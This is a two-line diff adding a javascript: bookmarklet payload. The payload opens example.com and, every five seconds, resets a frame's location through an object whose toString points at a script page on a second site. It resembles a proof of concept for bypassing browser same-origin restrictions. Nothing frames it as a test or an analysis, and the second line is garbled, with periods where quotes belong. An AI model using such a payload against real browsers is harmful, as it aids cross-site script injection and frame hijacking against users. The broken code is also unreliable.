@@ -1,0 +1,2 @@
+javascript:x=open('http://example.com/');setInterval(function(){try{x.frames[0].location={toString:function(){return 
+.http://www.example2.com/somescript.html.;}}}catch(e){}},5000);void(1);
